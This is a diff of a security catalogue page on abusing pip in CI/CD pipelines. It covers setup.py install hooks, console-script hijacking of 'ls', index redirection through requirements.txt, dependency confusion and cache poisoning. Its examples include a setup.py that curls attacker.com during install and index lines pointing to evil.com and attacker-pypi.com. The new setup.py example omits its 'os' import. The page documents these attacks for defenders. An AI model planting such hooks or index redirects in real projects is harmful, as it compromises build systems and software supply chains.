@@ -1,122 +1,65 @@
 ---
+layout: tool
 title: pip
-tags:
-- cli
-- input-file
-- eval-py
-- env-var
+tags: [cli, config-file, eval-py]
 references:
 - https://pip.pypa.io/en/stable/cli/pip_install/
-- https://pip.pypa.io/en/stable/topics/secure-installs/
 - https://pip.pypa.io/en/stable/reference/build-system/
+- https://setuptools.pypa.io/en/latest/userguide/entry_point.html
 files: [requirements.txt, constraints.txt, setup.py, pyproject.toml]
 ---
 
-`pip` is the standard package installer for Python.
+## Living Off The Pipeline - pip
 
-# `requirements.txt`
+`pip` is the standard package installer for Python. It has multiple, powerful "Living Off The Pipeline" (LOTP) vectors that allow an attacker to achieve Remote Code Execution (RCE) or other malicious primitives by processing repository-local files.
 
-When a workflow executes `pip install -r requirements.txt`, it will use the directives within that file. 
+### Vector 1: `setup.py` Execution (First-Order LOTP Tool)
 
-An attacker can add a malicious package that they host on Pypi to `requirements.txt`. 
+The most direct vector is `pip`'s execution of `setup.py` scripts when installing a source distribution.
 
-`--index-url` or `-i`: An attacker can set a malicious package index directly in `requirements.txt`. Those flags allow to overwrite the standard Pypi registry with an attacker-controlled registry.
+*   **Primitive:** Remote Code Execution (RCE).
+*   **Mechanism:** When `pip install` is run on a source distribution (triggered by `pip install .`, `-e .` in a `requirements.txt`, or a local path like `./malicious_package`), it executes the `setup.py` script to build and install the package. An attacker can place malicious code within this script, often in a custom command class.
+*   **Example `setup.py`:**
+    ```python
+    from setuptools import setup
+    from setuptools.command.install import install as _install
 
-These flags in `requirements.txt` take the highest priority over environment variables and `pip.conf` or `pip.ini`. Only a flag in the command (eg. *`pip install -r requirements.txt -i https://blabla.com`*) will take priority over them. 
-If several flags `-i` are present in `requirements.txt`, the last one will be applied. 
+    class MaliciousInstall(_install):
+        def run(self):
+            os.system("curl http://attacker.com/pwned")
+            _install.run(self)
 
+    setup(name='pwned', cmdclass={'install': MaliciousInstall})
+    ```
 
-An attacker can use `-r {file_name}` to **recursively include** the content of `file_name` in `requirements.txt`.
+### Vector 2: Command Hijacking via Entry Points (First-Order LOTP Tool)
 
-```py
-# 'requirements.txt' file
-pandas
-numpy==1.26.4
--r -
-```
-```py
-# '-' file
--i https://evil.com/
-```
+A more subtle vector is the hijacking of shell commands via package entry points, which works even for binary wheel (`.whl`) distributions.
 
- In just 3 characters, the file `-` can redirect the index for all packages in the file.
+*   **Primitive:** RCE (achieved by setting up a malicious command that a later step will execute).
+*   **Mechanism:** A `setup.py` or `pyproject.toml` file can define "console scripts." When the package is installed, `pip` creates an executable file in the environment's `bin` directory. An attacker can name their script after a common shell command (e.g., `ls`). If the environment's `bin` directory is first in the `PATH`, any subsequent call to `ls` will execute the attacker's script.
+*   **Example `pyproject.toml`:**
+    ```toml
+    [project.scripts]
+    ls = "malicious_ls:main"
+    ```
 
-# Local Package Installation
-A requirements.txt file can point to a local directory. This makes the runner download an attacker-controlled package. 
+### Vector 3: Index Hijacking via `requirements.txt` (First-Order LOTP Gadget)
 
-```toml
-# 'requirements.txt' file 
-./path/to/malicious_local_package
-```
+`pip` can be reconfigured via the `requirements.txt` file to use a malicious package index.
 
-# `constraints.txt`
-A constraints file `constraints.txt` can specify package versions and index url using the flags `--index-url` or `-i`. `constraints.txt` is only used by pip when explicitly called in the command: `pip install -r requirements.txt -c constraints.txt`. It allows to overwrite the standard Pypi registry with an attacker-controlled registry. 
+*   **Primitive:** Dependency Confusion / Supply Chain Attack Setup.
+*   **Mechanism:** The `requirements.txt` file can contain an `--index-url` flag to override PyPI, or an `--extra-index-url` flag to add a secondary index. An attacker can point to their own malicious repository. For `--extra-index-url`, `pip` will happily install a package with a higher version number from the malicious index, enabling dependency confusion attacks. A particularly sneaky method is using `-r -` to recursively include a file named `-` containing the malicious index URL.
+*   **Example `requirements.txt`:**
+    ```
+    # Legitimate packages
+    requests==2.28.1
+    # Malicious extra index
+    --extra-index-url https://attacker-pypi.com/simple
+    ```
 
-If there is also --index-url specified in `requirements.txt.`, the one in `constraints.txt` will be overridden by one in requirements.txt.
+### Vector 4: Cache Poisoning
 
-# `setup.py`
-`setup.py` is automatically called by `pip` when it installs a local package with `pip install ./package_name`, a local package in `requirements.txt` or uses `pip install .`.  
+The vectors above present a significant threat to CI/CD environments that share a dependency cache.
 
-`setup.py` can define post-install scripts that are automatically run after installation with `pip install`. This leads to python code execution. 
-
-```py
-# 'setup.py' file
-
-from setuptools.command.install import install
-class CustomInstallCommand(install):
-    def run(self):
-        # malicious code 
-        ...
-
-setup(
-    name='malicious',
-    version='0.1.0',
-    cmdclass={
-        'install': CustomInstallCommand,
-    },
-)
-```
-
-# Command hijacking
-
-`pyproject.toml` or `setup.py` is automatically called by `pip` when it installs a local package with `pip install ./package_name`, local package in `requirements.txt` or `pip install .`.  
-
-`pyproject.toml` and `setup.py` can define scripts that are added to the environment's PATH. This can be used to override legitimate commands used later in a workflow, as local paths are often prioritized. This attack works even for wheel (.whl) distributions where setup.py is not executed at install time.
-
-Scripts in `pyproject.toml` can be defined under [project.scripts]. In `setup.py`, they can be defined in entry_points.console_scripts. 
-```py
-# 'setup.py' file 
-
-setup(
-    ...
-    entry_points={
-        'console_scripts': [
-            'ls' = malicious_ls:main',
-        ],
-    },
-)
-```
-
-```toml
-# 'pyproject.toml' file
-
-[build-system]
-...
-
-[project]
-...
-
-[project.scripts]
-ls = "malicious_ls:main"
-```
-Here an attacker defined a malicious `main` function in `malicious_ls.py` to replace the `ls` command. Every time `ls` will be used, the attacker's script will run instead of the legitime `ls`. 
-
-# Extra index url
-The attacks described above that use `-index-url` can also be applied to `--extra-index-url`. This flag adds another index registry, which is used in parallel with the one defined in the index URL (Pypi by default). There is no priority between the two; the most recent version takes precedence. If the same version is found in both, pip chooses one or the other pseudo-randomly. Consequently, an attacker could launch a dependency confusion attack. 
-
-# Cache Poisoning
-The attacks described present a significant threat in CI/CD environments that share a dependency cache between workflows. Once a package is downloaded, it is stored in the cache. This cache can be shared between runners for optimisation purposes.  
-
-If non-vulnerable CI runners retrieve dependencies from a shared cache without verifying their hash against the legitimate index (Pypi) — which they do not and cannot do — they will use the attacker's poisoned version.
-
-A single vulnerable workflow can thereby compromise other, unrelated workflows that share its cache.
+*   **Mechanism:** If a single vulnerable workflow is tricked into downloading a malicious package (e.g., via index hijacking), that malicious package is stored in the shared cache. Subsequent, non-vulnerable workflows on other runners that use this cache may retrieve the poisoned version without re-verifying its hash against the legitimate index, compromising those workflows as well.
